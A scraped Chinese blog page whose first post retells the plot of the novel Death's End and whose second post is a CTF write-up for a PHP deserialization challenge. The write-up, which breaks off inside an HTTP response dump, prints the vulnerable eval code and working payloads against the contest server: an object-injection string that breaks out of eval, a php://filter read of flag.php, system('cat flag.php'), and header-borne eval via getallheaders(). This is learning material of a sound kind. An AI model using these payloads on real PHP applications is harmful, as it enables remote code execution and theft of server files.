<p>​        但AA和警察及时赶到，击断了维德的手臂，救了差点死掉的程心。还好AA及时发现了有人伪造她的声音跟程心通话。不然，诚信死定了。维德说的执剑人是什么，跟程心有用什么关系呢？在亚洲，北美，和欧洲，分布着三个引力波天线。还有一个在太空中的引力波天线，就是万有引力号飞船。执剑人掌握着启动引力波天线，向宇宙发射三体恒星坐标信号的权利。只要三体人不老实，信号就会发出去。不久后，三体世界和人类世界都会遭到黑暗森林打击。此时三体和人类这两个世界的文明都掌握在一个人的手里，这个人，就是逻辑。</p>
<p>​        此时的罗辑是第一任执剑人，在这个温柔的年代，人们惧怕危险的执剑人，渐渐的温柔的人们希望执剑人也是温柔的。于是民心所向，大家选择了程心作为下一任执剑人。这个时代的医疗技术已经很先进了，程心恢复得很快。不久后，程心见到了已是百岁老人的罗辑，此时的她已经白发苍苍，十分稳重而且坚定。从前的那个玩世不恭的花花公子消失了，他的妻子和孩子早已离开了他。罗辑在他人眼里变得越来越像一个恶魔，执剑人的交接仪式开始了，罗辑把控制引力波发射按钮的权杖，交给了程心， 罗辑退休了，他完成了使命。而程心万万没想到，她这个执剑人只当了15分钟，就在交接完后，潜伏在太阳系的六颗水滴，突然发动攻击，程心听着警报声不知所措，内心纠结的程心决定扔掉手中的发射控制器。</p>
<p>​        顷刻间，地球上三个引力波发射天线，全部被水滴撞毁。地球从此丧失了黑暗森林威慑能力。三体人一直隐藏着一项本领没有交给人类，那就是制造光速飞船的技术。三体人现在已经造出了光速飞船，四年后，新的三体舰队即将抵达地球。</p>
<p>​        三体人打破了两个文明间脆弱的平衡，智子给人们一年期限全部移民澳大利亚，如有不从者，格杀勿论。三体人不想灭绝人类，完全是出自于对地球文化的热爱和敬意。</p>
<p>​        但大多数人还沉浸在温柔乡里 ，不肯离去，等待奇迹发生。智子一看，原来你们把我说的话当耳旁风，于是没过多久，水滴开始在大城市里乱撞，高楼大厦逐个崩塌，一天内死了三十多万人。人们无奈之下开始往澳大利亚迁徙。</p>
<p>​        一年后，澳大利亚聚集了四十一亿六千万人，智子和水滴不可能管理这么多人，于是他们开始招募地球治安军，三体人给的待遇非常丰厚，既可获得自由，又可获得权力。一时间十亿人争相报名，最后有五百万人通过。</p>
<p>​        这帮治安军，开始还很收敛，但后来，随着澳大利亚的人越来越多，这帮人渐渐变成了魔鬼。随着移民期限的到来，治安军开始大量屠杀没有移民进澳大利亚的人。很多人组成了抵抗三体人的组织。这帮抵抗军的精神领袖便是罗辑。但他们并打不到三体人，因为三体人还没到。他们只能打打身为治安军的人类。</p>
<p>​        当移民结束后，智子切断了对澳大利亚的供给，包括食物，电力等生活必需品。智子的大意就是告诉澳大利亚的人们，你们现在开始人吃人吧。等人口降到三千万到五千万后，我们再开始供给。程心和AA也移民到了澳大利亚，她没被失望的人们打死，得多亏AA和智子的关照。</p>
<p>​        智子本来想带程心离开澳大利亚但被程心拒绝了，她把这个机会给了AA。程心当然知道，自己可能会在这被人吃掉，但心灰意冷的她，早就不在意了。</p>
<p>​        另一边正在追击蓝色空间号的万有引力号，三体人以为他们已经被跟随的水滴解决掉了。但是，万万没有想到，蓝色空间号进入了一个思维碎块，在这个空间里看三维时间的物体，就像看到了细节丰富的三维展开图。如果我在思维空间里拿走三维空间里一个人的心脏，这个被拿走心脏的人，不会有丝毫外伤，简直就是隔空取物。水滴虽然外表坚不可摧，但内部却很脆弱，人们通过四维空间，破坏了水滴的内部，随后，蓝色空间好通过思维空间进入了万有引力号，并控制了这艘飞船。不久后，蓝色空间号吸收了外有引力号上的两百多位船员。经过集体商议，他们认为三体人应该已经占领了地球，打破了和平协议。最终，大家决定，通过万有引力号，向宇宙发出三体恒星的坐标，进行打击报复。这两艘飞船履行完了对人类最后的责任，便继续向星海深处飘去。</p>
<p>​        万有引力号向宇宙发出三体的恒心坐标后，三体世界的恒星马上就被一颗光粒穿过，被彻底毁灭了。从此人们进入了广播纪元。</p>
<p>​        大移民完成后的第六天，三体恒行星被摧毁了。三体人彻底放弃了占领地球，因为他们知道，由于两个文明间长年累月的通讯，三体文明被打击后，太阳系被毁灭也只是时间问题。智子放弃了移民计划，苦难结束了。人们四处欢呼。</p>
<p>​        广播纪元七年，AA在澳大利亚没留多久，这些年她程心的公司打理的很好，成为了太空建筑业的巨头。那些三体人的人类治安军们开始被清算，无数的治安军被判处死刑或监禁。四年后，人们在地球上观测到了三体母星的毁灭，威胁了人类近三个世纪的三体世界，被彻底摧毁了。智子在广播纪元初消失了，偶尔也会作为三体世界的传声筒出现。为什么人类现在不去干掉智子，别忘了，水滴还在地球上呢。</p>
<p>​        有一天，智子突然请罗辑和程心去她家里喝茶，想和这两个老朋友叙叙旧。人们及其重视这次会谈，希望他们能带回一些有价值的信息，当所有人知道三体世界被毁灭后，智子曾代表全三体人在国际社会发表了一段简短的讲话。话语里没有谴责，没有怨恨，没有评价，只是简单通报了灾难过程。三体文明从此开始了星舰文明。</p>
<p>​        罗辑和程心进入了智子的家里。随后，开始了具有重要历史意义的茶道谈话。这场谈话一开始，程心就急于询问各种问题，智子给出的回答，大概就是，太阳系被摧毁是肯定的，但需要一段时间。可能有一两个世纪。当务之急，就是赶紧跑。随后，智子希望不要再被提问。她说，我请二位，是来喝茶道别的。此时，一直沉默的罗辑开口说，我可以再问一个问题么？智子请罗辑稍等一下，沉思过后对罗辑说道，可以，这是出于我们三体人对罗辑您的尊重，但我只能回答你，是，不是或不知道。然后，我便不会再回答二位任何问题了。罗辑丝毫没有犹豫，问出了最后一个问题。在宇宙中存不存在一种安全声明，可以避免黑暗森林打击。整个屋子寂静了很久，智子终于开口了，她说，有。</p>
<p>​        茶道谈话结束了，所有人都在思考如何发布安全声明。宗教总是在人们消极的时代兴旺，地球逐渐成为一个大教堂，一颗祈祷之星。由于三体人知道如何发布安全声明，三体成为了人们心中的神，智子成为了被祈祷的对象。智子的家门口，每日都有成千上万的人在此祈祷，但智子每次也只是向众人微微鞠躬，然后悄然退去。智子要离开的那一天到了，它会离开这个美丽的躯壳，飞往三体舰队。她最后一次会见了罗辑和程心，这次，三个人没说什么话，因为他们都知道，该说的都说完了。智子打破了寂静，她说，我要走了，请二位多多保重。宇宙很大，生活更大，也许以后还有缘再见。还有，程心，云天明要见你。</p>
<p>​        三体文明比地球文明强大太多了，人类在三体人眼里就是虫子，三体人面对虫子的威胁，表现出来的不是憋屈，不是不情愿，而是非常真诚，但又不停地群钊打破这种平衡的可能，这招用的好厉害。差点就把人类给搞定了。看来不懂计谋的三体人，跟人类打交道的这300多年里，跟着学会了不少阴招。两个文明的平衡，就握在执剑人手里，一个合格的执剑人才能保持这种平衡。可惜，想用爱拯救世界的程心不是这个人，在三体的母星被摧毁后，三体人面对自己的宿敌，表现出了得体、礼貌和成熟，没有丝毫怨恨，也没有谈论是非，仅用平淡的茶会结束了300多年的对决。</p>
<h3 id="死神永生-下"><a href="#死神永生-下" class="headerlink" title="死神永生 下"></a>死神永生 下</h3><p>​        智子对程心说，云天明要见你，这句话从何说起。原来，当初三体人一直关注着阶梯计划，当第一批三体舰队，因为罗辑的威胁被迫离开太阳系后，他们决定，去找装有云天明大脑的探测器作为纪念品。</p>
<p>​        从云天明能见程心来看，云天明在三体飞船那里混得还算不错。三体人严正声明，这只是云天明和程心两个人之间的事，双方不能提及三体文明，会面不得有第三方在场，也不能以任何形式记录，为了保证隔离性，这次会面设立在太空中。程心乘坐飞船飞到指定地点后，智子将简历远程的实时视频通讯。如果三体人发现，谈话中设计不允许提及的内容，那么，程心得飞行器将会爆炸。</p>
<p>​        通讯开始了，程心看到了云天明，他的身体被三体人复原了，云天明看起来很健康，很年轻。云天明告诉程心，他在三体飞船上平时除了种地消遣，就是给三体人的孩子们讲故事。这里顺带一提，由于三体文明文化的匮乏，所以三体人特别喜欢挺云天明讲故事。云天明还在那出了书，成为了三体世界知名的文学家。由于三体人已知监视着这场谈话，云天明在跟程心聊了很多家常话后，便给他讲了三个他在飞船上经常给三体人讲的故事。谈话便结束了。在最后的一分钟，程心对云天明提出了约会邀请，她说，宇宙很大，生活更大，我们还会相见的。如果有机会，就在你送给我的那颗星星上见面吧。云天明在最后一刻回答到，好，在我们的星星。</p>
<p>​        通讯结束。当程心返航后，被立马带进了一个小房间，这个房间是智子盲区。虽然三体人已经明确表示，智子会全部撤离地球，单位了保险起见，为了云天明的安全，需要在这里记录下谈话的内容。程心在返程中，心理不断背着云天明给她将的三个故事，因为她知道，这三个故事就是拯救地球的关键，通过长时间的解读，人们终于发现了隐藏在这三个故事中的秘密。</p>
<p>​        1、光速飞船的法发展方向应使用空间曲率驱动器，这种驱动器是通过影响空间，利用空间的曲率把飞船拉至光速。打个比方，就像在小纸船的船尾，装一块小香皂，船会自动向前。这是因为肥皂改变了水的张力，但船前方水面的张力不变，从而把船拉了过去。2、用一层低光速带包裹住太阳系，这就是全宇宙通用的安全生声明。这个被包裹的区域被称之为黑域，在这个黑域里，没有飞船可以飞出去，黑域是一个完全封闭的空间，在这里，人们可以获得安全，但会失去自由。3。最后一个秘密暂且不表，因为直到最后，有人才发现了它。</p>
<p>​        三体人彻底离开而来太阳系。不久后人们为了避免被光粒打击的灾难，开始了，掩体工程。什么是掩体工程呢？以木星、土星、天王星和海王星四大巨星为掩体，在他们的背阳面建造太空城。为什么人们不造光速飞船准备跑路呢？一方面光速飞船会在太空中留下印记，很容易被高级文明观测到；另一方面，在这个时代人权意识极强，因为只有少部分人能离开，大部分人要留下，所以制造光速飞船成为了严重的违法行为。但程心和AA知道，建造光速飞船才是人类的出路。</p>
<p>​        有一天，维德找到了程心，对她说，造光速飞船是一条正确的路。但你没有力量造出来，把你拥有的一切资源给我，让我来，维德随后的一句话让程心同意了。他冷静的对程心说，不要犯第二次错，思索良久后，程心答应了维德。但她有个条件，她说，当你做的事危害人类的生命时，我可以收回你的权利。维德答应了。程心和AA进入了冬眠，等待成果。接下来，程心得公司全权由维德负责。</p>
<p>​        掩体纪元十一年，沉睡了62年的程心被唤醒，由于多次冬眠，程心现在的实际年龄是33岁，在这个平均寿命150岁的年代里，她还是个少女。在这个纪元，形成了四个太空城群落，分别分布在木星、土星、天王星、海王星的背阳面，地球成为了太阳系联邦中的一个普通城邦。现在地球上，人烟稀少，只有五百万不怕死的人生活在那里，每个人在那生活得像国王一样，大自然重新占领了地球。很多人不愿意留在地球是因为，如果太阳系遭受光粒打击，那么地球上的人将无一幸免。程心被带到了一座叫星环城的太空城，他在这见到了一百多岁的维德。维德一直在研发光速飞船，现在已经小有成果。但就在关键时刻，由于联邦政府的反复阻挠，维德与他们撕破了脸，维德现在被政府军包围。但以维德现在的实力，他可以拼死一搏，斗个鱼死网破。但他对程心有承诺，政府唤醒程心得原因，就是希望她可以权维德放下武器。经过维德六十年的努力，曲率驱动器已经研制的差不多了，是否能够继续，就看程心一句话。程心现在想，如果战斗开始，成千上万人会死于非命，善良的程心对维德说吗，你的诺言还有效吗？维德点了点头，程心说道，好，立刻停止一切。维德近乎恳请的说到，再考虑一下吧，程心坚定的说，不需要考虑。维德无助的说到，失去人性，失去很多；失去兽性，失去一切。程心果断的回答道，我选择人性。</p>
<p>​        现场寂静了，维德让众人放下武器，准备投降。维德心中勇往直前的火焰熄灭了。他微笑的对程心说，小女孩，你看我遵守了诺言。不久后，被捕的维德被处以死刑。程心想到未来，去看太阳系被打击后的世界。便再次进入了冬眠。</p>
<p>​        掩体纪元六十七年。此时一艘太空飞船发现了太阳系。这艘飞船主要的任务，就是藏好自己并清理他们发现的低级文明。其中，有一个被称为歌者的底层工作人员，向领导申请了一片叫二向箔的武器，漫不经心的将它仍忘了太阳系。</p>
<p>​        在太空城内，程心和AA都被唤醒了。黑暗森林打击终于降临了，没有人向掩体逃跑，因为太阳系并没有遭到光粒打击，而是受到了一片小纸条。人们通过引力波找到了这张没有厚度，只有一张信用卡代销的白色纸条。过了一段时间，这张小纸条突然越来越大，所有接触他的物体，都遭到了降维打击。从三维降到二维，成了一张画。在俄二向箔周围的飞船准备逃离，但他们发现，只有光速才能逃离二向箔的引力。以这张纸条变大的速度，八到十天后，整个太阳系都将变成一张没有厚度的画。这就是云天明在故事里，最后隐藏的秘密。降维打击。</p>
<p>​        人类多年来，殚精竭虑的在太阳系布置掩体城市，但人类知道掩体，难道那些拥有更高级明文的外星人就不知道吗？弱小和无知不是生存的障碍，傲慢才是。</p>
<p>​        程心和AA在冥王星上的太空博物馆里，找到了快两百岁的罗辑，三人寒暄了一阵后，开始将一些名画运到了飞船上。他们不希望这一些画同博物馆一同二维化。因为那样，未来到访的外星人可能就解读不了人类曾经的文化瑰宝了。罗辑自己留下了一幅画，这幅画就是蒙娜丽莎，他年轻时曾在这幅画面前，与一人陷入爱河。</p>
<p>​        罗辑催促他们尽快上飞船把画运到外面，他自己决定留在这个博物馆里，和蒙娜丽莎一起看着太阳系被二维化。其实，程心他们乘坐的这艘飞船大有来历，这艘飞船名叫星环号，不仅使用了些跟水滴一样坚固的材料，还装备了完整的生态系统和常规引擎，此外，还拥有曲率驱动引擎可进行光速航行。这艘飞船，是太阳系唯一一艘光速飞船。这是怎么回事呢？</p>
<p>​        罗辑通过远程视频通讯，告诉了一直蒙在鼓里程心和AA。原来，维德死后，残余的力量并没有放弃。曾经面壁者雷迪亚兹在水星上做爆炸试验，把水星炸了个大坑。为了隐蔽，维德的余党就把基地设立在了这里，他们对外表示在研究太阳活动。后来联邦政府介入，并一起悄悄地研究光速飞船。星环上安装的引擎就是第一代试验品。只有少数年迈的元老知道这件事，其中，就包括罗辑。</p>
<p>​        程心想回去接罗辑，但飞船不听程心的。因为罗辑，拥有这艘飞船的最高指挥权。罗辑笑了笑说，我这样岁数的人不适合远航，孩子们不要为我操心了，我什么都没有失去。罗辑命令星环号进入光速航行到太阳系以外。飞船开始启动，船后的空间开始畸变。</p>
<p>​        很多人乘坐着常规推动器的飞船，想逃出太阳系。但那是不可能的。但他们看到星环号后面的空间正在畸变时，这些人发现，这是一艘正在加速的光速飞船。于是，这些近乎疯狂的人，有的要去拦截，有的要去击毁，有的要去劫持。但星环号非常的坚固，这些人想把飞船刮破一点皮儿都难。如果当初程心没有组织维德，耽误了那宝贵的时间，光速飞船是个可以批量生产的。但现在，一切都晚了。程心从逻辑的眼神中读出了一句话，孩子，看看你都干了些什么呀。</p>
<p>​        程心现在明白了，什么掩体，什么安全声明，只有光速飞船才是活路。云天明指出了这条路，而程心却把它堵死了。程心到头来，还是犯了第二次错误。程心开始恨维德，为什么要履行承诺。在通话的最后一刻，罗辑说，我要进画里了，孩子们走好。</p>
<p>​        飞船要进入光速了，程心突然想到自己还有个约会。程心说，去我们的星星。于是，太阳系仅存的两个女人，给忘了云天明送给程心的星星。一段时间后，星环号到了这颗恒星，并在一颗蓝色的行星上降落了。在这颗蓝星上有一个帅气的男人在迎接他们。这个人，名叫关一帆。是万有引力号上的研究员，五年前才在冬眠中被唤醒。他收到了星环号的引力波信号，所以留在这等她们。从这个人的口中，二人得知，到头的万有引力号和蓝色空间号上的人，成功创建了四个世界，并且还在扩张中。这颗蓝星上，没有高等生命，像是原始的地球。他们三人在这待了一段时间。</p>
<p>​        有一天，关一帆发现，临近的另一颗灰色行星上有飞船的踪迹。关一帆要去前往查看，程心要跟着，因为她想这可能和云天明有关。AA留在蓝星等着他们回来。二人乘坐关一帆的亨利号，前往灰星。在飞船上，关一帆高速程心，宇宙中最可怕的武器就是，宇宙规律。二向箔就是其中之一。二向箔在高等文明那很常用，它一旦展开就会无限扩张，所以，总有一天，整个宇宙也会二维化。宇宙正在死去，一些大神级文明，他们已经在研究，如何将自己二维化后，能继续活在二维世界里。大概在一百多亿年前，宇宙起码有十维。经过不断地星际战争，宇宙才变成先进的三维。有一批大神级文明，他们在努力使宇宙重启。</p>
<p>​        航行了几天，飞船抵达了灰星，在那里，他们没有找到云天明，而是看见了高等外星文明留下的死线。死线极其的黑，任何东西进去，都出不来，连光也一样。死线随时会破裂，破裂后的死线会形成低光速带，成为黑域。在这片区域里，光会变得非常慢。关一帆看到这一场景，连忙带着程心飞回蓝星，在返回的过程中，亨利号收到了AA的通讯，AA激动地告诉程心，云天明来了，现在就在蓝星上，我去找他过来和你说话。为了保证通讯安全，不被周围的外星人发现。不用了，我们马上就回去，随机关掉了通讯。正当程心他们要回到蓝星时，突然死线破裂，他俩进入了时间真空。十六天后，程心和关一帆，才脱离了黑域，回到了蓝星。在时间真空里虽然只过了16天，但此时，蓝星上已经过了一千八百九十万年。</p>
<p>​        程心很难过。因为她永远错过了云天明。二人用探测器发现了刻在石头上巨大无比的几个字，上面写着，我们度过了幸福的一生。我们送给你们一个小宇宙，在里面躲过坍缩，去新的世界。</p>
<p>​        他们发现了这个小礼物，这是一个由微亮细线画出来的门，两人牵着手，一同进入了这扇门。这里是一个一立方千米的循环空间，如果你从头跑到尾，你会发现，自己又回到了起点。在这个空间里，有一片美丽的田园。生活用品，一应俱全。这篇小天地就是云天明送给程心的第二件礼物，一个小宇宙。程心在这里看见了老朋友，智子。她用的躯壳还是跟地球上的外形一样。智子，是这里的管家，智子对程心说，宇宙很大，生活更大，我们真的又相会了。</p>
<p>​        智子告诉他们，这里是云天明送给二位的礼物，在这，时间会过得非常慢，只需在这待上十年，外面的宇宙，就会重启。程心和关一帆在这开始了甜蜜的生活，智子成为了他俩的老师。教他们三体里的知识，生活了许久后，他们收到了一个大神级文明向全宇宙广播的信号，这个信号包含了百万种语言，都是大神级文明，认为值得被通知的外星文明。在这信息中，他们发现了人类和三体人的语言。内容大致如下，请把你们制造的小宇宙归还到大宇宙中，大宇宙因为你们偷走的质量，将会在膨胀中死去。归还小宇宙，意味着在里面的居住者要回到大宇宙中。程心和关一帆决定归还小宇宙返回大宇宙中。</p>
<p>​        智子开始负责归还小宇宙，在这个小宇宙的底下，藏有一艘小型飞船，这艘飞船浓缩了三体世界最先进的技术。程心没有把这个小宇宙全部归还，她在这留下了五公斤。留下了一个生态球，里面养着小鱼。她希望，这个空间里还能有生命存在。智子对两位朋友说到，放心，我在，你们就在。随后，飞船启动，飞向了未知的大宇宙。</p>
<p>​        三体系列的整个故事，到此结束了。程心这一辈子，都在攀登一道责任的阶梯，小时候的她责任是好好学习，不让爸妈失望，努力成为一个优秀的人。长大后，她要为工作负责，为阶梯计划负责。后来云天明送个她的一颗星星。促使她成为了执剑人，这时的她要为全人类负责。后来她的责任变得复杂起来，本来她想给人插上光速飞行的翅膀，却不得不制止。最后她要为整个宇宙负责，归还属于自己的小宇宙。</p>
<p>​        人类，在面对即将到来的黑暗森林打击时，由于受到道德枷锁的限制，做出了很多决策失误，导致太阳系不复存在。只有程心与AA从太阳系逃出。三体系列的整个故事，告诉了我们一个真理。在浩瀚的宇宙中，永恒的只有死神。</p>
<h2 id="原视频链接"><a href="#原视频链接" class="headerlink" title="原视频链接:"></a>原视频链接:</h2><p><a href="https://www.weibo.com/tv/v/HFze2EH9A?fid=1034:4399060850003080" target="_blank" rel="noopener">https://www.weibo.com/tv/v/HFze2EH9A?fid=1034:4399060850003080</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/08/02/三体/" data-id="ck2g3l2of001glgv37qgv5njd" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/book/">book</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Object" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/31/Object/" class="article-date">
  <time datetime="2019-07-31T07:42:00.000Z" itemprop="datePublished">2019-07-31</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/31/Object/">Object</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>别问第四天去哪了，昨晚想做题的时候，buuoj.cn好像被d了，啊凑~。（今天的buuoj也仍然崩着23333，所以今天去做了西电招新赛的题）</p>
<h3 id="Object-1"><a href="#Object-1" class="headerlink" title="Object"></a>Object</h3><p>代码审计题</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="comment">//flag在flag.php里 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> $cmd=<span class="string">'index.php'</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/\w+\((?R)?\)/'</span>, <span class="keyword">$this</span>-&gt;cmd))&#123; </span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">'$a="'</span>.<span class="keyword">$this</span>-&gt;cmd.<span class="string">'";'</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hack!!!'</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'fl'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'ag'</span>])) &#123; </span><br><span class="line">    <span class="keyword">die</span>(@highlight_file(<span class="string">'index.php'</span>,<span class="keyword">true</span>)); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">if</span> (!(preg_match(<span class="string">'/[A-Za-z0-9]+\(/i'</span>, $_GET[<span class="string">'fl'</span>]))) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'hack!!!'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="keyword">echo</span> unserialize($_GET[<span class="string">'ag'</span>]); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>首先，fl 和 ag要赋值</p>
</li>
<li><p>然后，fl这个正则是任意字母数字加一个左括号</p>
</li>
</ol>
<p>那么，fl=123(</p>
<ol start="3">
<li>然后是ag的值</li>
</ol>
<p>这里有个反序列化，在加上flag类有一个魔术方法__destruct()，并且魔术方法中的cmd的值可控，所以构成反序列化漏洞。</p>
<p>然后ag也有一个正则匹配，/\w+\((?R)?\)/，规则就是字符串加一对括号，比如phpinfo()，(?R)?是递归，即</p>
<p>phpinfo(phpinfo())，phpinfo(phpinfo(phpinfo()))，这样都可以过正则。</p>
<p>所以接下来要考虑的就是怎么构造ag来拿到flag</p>
<p>首先eval函数里是，$a=”???”;</p>
<p>是一个赋值语句，这显然没办法拿到flag，所以考虑闭合他，构造cmd=a()”;        (这样是为了绕过正则)</p>
<p>然后再加点，cmd=a()”;phpinfo();//</p>
<p>序列化得：O:4:”flag”:1:{s:3:”cmd”;s:17:”a()”;phpinfo();//“;}</p>
<p><img src="/2019/07/31/Object/1564557457854.png" alt="1564557457854"></p>
<p>发现网页崩了，去问了出题人，出题人说我都没走进destructi方法（wtf？）</p>
<p>后来我发现，把源代码中</p>
<p>else {<br>        echo unserialize($_GET[‘ag’]);<br>    } </p>
<p>里面的echo去掉才能反序列化，（这又是为啥）</p>
<p>然后出题人说，把序列化字符串里的对象数目改成2就可以了，（嗯么？）</p>
<p><img src="/2019/07/31/Object/1564557470651.png" alt="1564557470651"></p>
<p>果然成功了（所以为啥？）</p>
<p>那么接下来方法就有很多了，我直接写了一个任意文件包含加php伪协议来读取，</p>
<p>payload：</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/39.105.168.42:8001/</span>?fl=<span class="number">123</span>(&amp;ag=<span class="symbol">O:</span><span class="number">4</span><span class="symbol">:<span class="string">"flag"</span></span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:</span>&#123;<span class="symbol">s:</span><span class="number">3</span><span class="symbol">:<span class="string">"cmd"</span></span>;<span class="symbol">s:</span><span class="number">74</span><span class="symbol">:<span class="string">"a()"</span></span>;<span class="keyword">include</span><span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;<span class="regexp">//</span><span class="string">";&#125;</span></span><br></pre></td></tr></table></figure>

<p>然后师傅们还有别的方法，直接system</p>
<p>payload：</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/39.105.168.42:8001/</span>?fl=<span class="number">123</span>(&amp;ag=<span class="symbol">O:</span><span class="number">4</span><span class="symbol">:<span class="string">"flag"</span></span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:</span>&#123;<span class="symbol">s:</span><span class="number">3</span><span class="symbol">:<span class="string">"cmd"</span></span>;<span class="symbol">s:</span><span class="number">30</span><span class="symbol">:<span class="string">"a()"</span></span>;system(<span class="string">'cat flag.php'</span>);<span class="regexp">//</span><span class="string">";&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/31/Object/1564557873866.png" alt="1564557873866"></p>
<p>但是出题人的预期解是不想让你在$ag这个字符串里的括号里面带参数的，（然而那个正则只匹配一次，a()”;system(cat flag.php)        这前半部分过了，正则就过了）</p>
<p>所以出题人原意是想让你用getallheaders()这个函数2333</p>
<p>payload:</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">39.105</span>.<span class="number">168.42</span>:<span class="number">8001</span>/?fl=<span class="number">123</span>(&amp;ag=O:<span class="number">4</span>:<span class="string">"flag"</span>:<span class="number">2</span>:&#123;<span class="keyword">s</span>:<span class="number">3</span>:<span class="string">"cmd"</span>;<span class="keyword">s</span>:<span class="number">33</span>:<span class="string">"<span class="subst">$&#123;<span class="keyword">eval</span>(implode(getallheaders()))&#125;</span>"</span>;&#125;</span><br><span class="line"></span><br><span class="line">$a=$&#123;<span class="keyword">eval</span>(implode(<span class="keyword">system</span>(<span class="string">'cat flag.php'</span>);<span class="regexp">//</span>))&#125;</span><br><span class="line"></span><br><span class="line">再加上</span><br><span class="line"></span><br><span class="line">cmd: <span class="keyword">system</span>(<span class="string">'cat flag.php'</span>);<span class="regexp">//</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/31/Object/1564559984788.png" alt="1564559984788"></p>
<p>（还可以多此一举的读一读base64后的源码23333， system(‘cat flag.php|base64’);//）</p>
<p><img src="/2019/07/31/Object/1564560169454.png" alt="1564560169454"></p>
<p>原理呢，，，（我直接用题目的网站测试了）</p>
<p>cmd: var_dump(getallheaders());//</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span>: Wed, 31 Jul 2019 08:12:03 GMT</span><br><span class="line"><span class="attribute">Server</span>: Apache/2.4.29 (Ubuntu)</span><br><span class="line"><span class="attribute">Vary</span>: Accept-Encoding</span><br><span class="line"><span class="attribute">Content-Length</span>: 699</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">array(10) &#123;</span><br><span class="line">  ["cmd"]=&gt;</span><br><span class="line">  string(28) "var_dump(getallheaders());//"</span><br><span class="line">  ["Host"]=&gt;</span><br><span class="line">  string(18) "39.105.168.42:8001"</span><br><span class="line">  ["Cache-Control"]=&gt;</span><br><span class="line">  string(9) "max-age=0"</span><br><span class="line">  ["Upgrade-Insecure-Requests"]=&gt;</span><br><span class="line">  string(1) "1"</span><br><span class="line">  ["User-Agent"]=&gt;</span><br><span class="line">  string(115) "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 